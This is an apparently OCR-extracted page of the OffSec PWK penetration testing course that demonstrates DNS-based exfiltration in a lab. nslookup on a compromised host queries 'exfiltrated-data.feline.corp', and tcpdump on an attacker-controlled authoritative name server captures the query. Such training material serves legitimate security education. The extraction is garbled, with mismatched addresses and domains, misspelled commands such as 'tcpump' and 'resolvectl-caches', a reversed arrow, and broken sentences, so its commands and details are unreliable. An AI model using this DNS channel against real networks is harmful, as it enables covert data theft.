# # OffSec

Penetration Testing with Kali Linux

outgoing network connectivity, use nslookup to directory in FELINEAUTHORITY of our Kali machine.

As an experiment, let's use nslookupdatabase01:- nslookup a DNS request for exfiltrated-data.feline.com.

```
database_admin@database01:-$ nslookup exfiltrated-data.feline.corp
Server: 127.0.0.5
Address: 127.0.0.53#53
```

** server can't find exfiltrated-data.feline.corp: NXDOMAIN

> Listing 604 - Using nslookup to make a DNS request for exfiltrated-data.feline.corp

This returns an NXDOMAIN response that indicates the DNS request failed. This is expected though, even if we've configured our DNS server to actually serve any. requests.

nslookup used the DNS server running on the localhost interface 127.0.0.1. This is normal as the DNS resolver provided by systemd-resolved running on Ubuntu. It will forward the query to the DNS server that's configured by Netplan. It may cache cache results. If we received outdated responses, we should try flushing the local DNS cache with resolvectl-caches. We can also query the DNS server directly by appending the address to the nslookup command. For example: nslookup exfiltrated-data-feline.corp 192.168.0.54.

The tcpdump command on FELINEAUTHORITY captured packets from MULTISERVER03.

```
felineauthority=$$ sudo tcpdump -i ens192 udp port 53
[password for kali]:
tcpump: verbose output: [ -v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot 262144 bytes
04:57:40.162 IP 192.168.0.54:65122 > 192.168.1.4.domain: 26234 [tran] A?
exfiltrated-data.feline.corp (57)
04:57:40.72178 IP 192.168.1.4.domain < 192.168.0.54:65122: NXDOMAIN 0/1 (5)
```

> Listing 605 - tcpdump for exfiltrated-data.corp forming in FELINEAUTHORITY from MULTISERVER03

In this case, we've received a DNS request for exfiltrated-data.corp on FELINEAUTHORITY. This happened because MULTISERVER03 determined the authoritative name server for the feline.corp zone. All requests for any subdomain of feline.corp will be forwarded to FELINEAUTHORITY. We didn't Tell Dnsmas on FELINEAUTHORITY what to do for requests for exfiltrated-data.corp, so Dnsmas just returned an NXDomain__ response. We can see this in the following diagram.

964 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Nslookup
965 (Ubuntu, 2022), https://manpages.ubuntu.com/manpages/man8/systemd-resolved.service.html

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

626